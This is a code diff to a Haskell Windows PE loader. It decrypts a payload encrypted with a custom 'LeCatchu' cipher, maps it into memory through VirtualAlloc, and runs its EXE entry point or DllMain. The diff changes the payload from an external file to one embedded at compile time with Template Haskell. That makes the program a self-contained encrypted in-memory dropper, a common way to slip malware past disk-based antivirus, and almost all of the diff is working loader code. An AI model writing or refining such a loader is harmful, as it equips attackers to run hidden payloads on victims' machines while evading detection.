@@ -1,6 +1,7 @@
 {-# LANGUAGE ForeignFunctionInterface #-}
 {-# LANGUAGE RecordWildCards #-}
 {-# LANGUAGE BangPatterns #-}
+{-# LANGUAGE TemplateHaskell #-}
 
 module Main where
 
@@ -16,7 +17,10 @@ import Control.Exception
 import System.IO (hSetBuffering, BufferMode(LineBuffering), stdout, stderr, hFlush)
 import System.Timeout (timeout)
 import System.Exit (exitFailure)
-import System.Environment (getArgs)
+import Data.FileEmbed (embedFile)
+import qualified Data.ByteString as BS
+import qualified Data.ByteString.Char8 as C8
+import qualified Data.ByteString.Unsafe as BSU
 
 -- Import LeCatchu cryptographic library
 import LeCatchu
@@ -25,10 +29,8 @@ import LeCatchu
 -- CONFIGURATION
 -- ============================================
 
--- Default encrypted payload filename
-defaultPayloadFile :: String
-defaultPayloadFile = "encrypted_payload.bin"
-
+-- The payload is now embedded at compile time.
+-- The build script must generate "payload.bin" before compiling.
 -- ============================================
 -- WINDOWS API FFI BINDINGS
 -- ============================================
@@ -547,19 +549,26 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
     hFlush stdout
     error "Image size exceeds safety limit"
 
+  -- Reserve the address space for the image
   let imageSizeC = fromIntegral imageSize :: CSize
-  imageBase <- c_VirtualAlloc nullPtr imageSizeC (mEM_COMMIT .|. mEM_RESERVE) pAGE_READWRITE
+  imageBase <- c_VirtualAlloc nullPtr imageSizeC mEM_RESERVE pAGE_NOACCESS
   when (imageBase == nullPtr) $ do
     err <- c_GetLastError
-    error $ "VirtualAlloc failed (error: " ++ show err ++ ")"
+    error $ "VirtualAlloc (MEM_RESERVE) failed (error: " ++ show err ++ ")"
 
-  putStrLn $ "[*] Allocated image base: 0x" ++ showHex (ptrToWordPtr imageBase) ""
+  putStrLn $ "[*] Reserved image base: 0x" ++ showHex (ptrToWordPtr imageBase) ""
   hFlush stdout
 
   let imageBasePtr = castPtr imageBase :: Ptr Word8
 
+  -- Commit and copy headers
   let headersSize = fromIntegral $ oh_sizeOfHeaders optHeader
+  committedHeaders <- c_VirtualAlloc imageBase (fromIntegral headersSize) mEM_COMMIT pAGE_READWRITE
+  when (committedHeaders == nullPtr) $ do
+    err <- c_GetLastError
+    error $ "VirtualAlloc (MEM_COMMIT for headers) failed (error: " ++ show err ++ ")"
   copyBytes imageBasePtr (castPtr dataPtr) headersSize
+  putStrLn "[*] Committed and copied PE headers."
   hFlush stdout
 
   let fileHeader = nt_fileHeader ntHeaders
@@ -571,13 +580,27 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
 
   forM_ [0..numSections-1] $ \i -> do
     section <- peekElemOff sectionHeaderPtr i
-    when (sec_sizeOfRawData section > 0) $ do
-      let dest = plusPtr imageBasePtr (fromIntegral $ sec_virtualAddress section)
-          src = plusPtr dataPtr (fromIntegral $ sec_pointerToRawData section)
-          size = fromIntegral $ sec_sizeOfRawData section
-      putStrLn $ "[*] Copying section " ++ show i ++ " size " ++ show size
+    let vAddr = fromIntegral $ sec_virtualAddress section
+        dest = plusPtr imageBasePtr vAddr
+        vSize = fromIntegral $ sec_virtualSize section
+        rawSize = fromIntegral $ sec_sizeOfRawData section
+
+    when (vSize > 0) $ do
+      -- Commit memory for the section
+      committedSection <- c_VirtualAlloc dest vSize mEM_COMMIT pAGE_READWRITE
+      when (committedSection == nullPtr) $ do
+        err <- c_GetLastError
+        error $ "VirtualAlloc (MEM_COMMIT for section " ++ show i ++ " at RVA 0x" ++ showHex vAddr "" ++ ") failed (error: " ++ show err ++ ")"
+
+      putStrLn $ "[*] Committed section " ++ show i ++ " at RVA 0x" ++ showHex vAddr "" ++ " size " ++ show vSize
       hFlush stdout
-      copyBytes dest src size
+
+      -- Copy data if there is any
+      when (rawSize > 0) $ do
+        let src = plusPtr dataPtr (fromIntegral $ sec_pointerToRawData section)
+        putStrLn $ "    -> Copying " ++ show rawSize ++ " bytes of raw data"
+        hFlush stdout
+        copyBytes dest src rawSize
 
   let ntHeadersInMem = castPtr imageBasePtr `plusPtr` ntOffset :: Ptr ImageNtHeaders64
 
@@ -590,6 +613,13 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
   let entryPointRVA = oh_addressOfEntryPoint optHeaderInMem
       entryPointPtr = plusPtr imageBasePtr (fromIntegral entryPointRVA)
       subsystem = oh_subsystem optHeaderInMem
+
+  let fileHeader = nt_fileHeader ntHeaders
+      characteristics = fh_characteristics fileHeader
+      isDll = (characteristics .&. 0x2000) /= 0
+
+  putStrLn $ "[*] Is DLL: " ++ show isDll
+  hFlush stdout
 
   when (entryPointRVA == 0) $
     error "Invalid entry point"
@@ -605,14 +635,18 @@ loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen)
     putStrLn "[*] Execution gate passed. Executing entry point (in-memory)."
     hFlush stdout
 
-    if subsystem == 2 || subsystem == 3
+    if not isDll
       then do
+        putStrLn "[*] Executing as EXE."
+        hFlush stdout
         let entryFunPtr = castPtrToFunPtr entryPointPtr :: FunPtr (IO Int32)
         rc <- mkEntryPoint entryFunPtr
         putStrLn $ "[*] Entry point returned: " ++ show rc
         hFlush stdout
         return ()
       else do
+        putStrLn "[*] Executing as DLL."
+        hFlush stdout
         let dllMainFunPtr = castPtrToFunPtr entryPointPtr :: FunPtr (Ptr () -> Word32 -> Ptr () -> IO Int32)
         rc <- mkDllMain dllMainFunPtr imageBase dLL_PROCESS_ATTACH nullPtr
         putStrLn $ "[*] DllMain returned: " ++ show rc
@@ -685,16 +719,23 @@ main = do
   hSetBuffering stdout LineBuffering
   hSetBuffering stderr LineBuffering
 
-  putStrLn "[*] PE Loader with LeCatchu v9 Decryption (External Payload)"
+  putStrLn "[*] PE Loader with LeCatchu v9 Decryption (Embedded Payload)"
   putStrLn "[*] ==========================================================="
 
-  -- Get payload filename from command line or use default
-  args <- getArgs
-  let payloadFile = if null args then defaultPayloadFile else head args
+  -- The payload is embedded at compile-time using Template Haskell
+  -- We run the encoder script and capture the output directly
+  let encodedPayload = $(embedFile "payload.bin")
 
-  putStrLn $ "[*] Payload file: " ++ payloadFile
+  putStrLn $ "[*] Embedded payload size: " ++ show (BS.length encodedPayload) ++ " bytes"
   hFlush stdout
 
+  -- When embedding directly, we are getting the 'encrypted' bytes.
+  -- The original code did: leCatchuDecode encodedPayload.
+  -- But our encoder.py produces ENCRYPTED data.
+  -- So we have: Encrypted -> encodedPayload.
+  -- Then: leCatchuDecode calls 'decryptWithIV'.
+  -- So it matches. Encrypted -> Decrypted.
+  
   let decoded = leCatchuDecode encodedPayload
   putStrLn $ "[*] Decrypted payload size: " ++ show (BS.length decoded) ++ " bytes"
   hFlush stdout
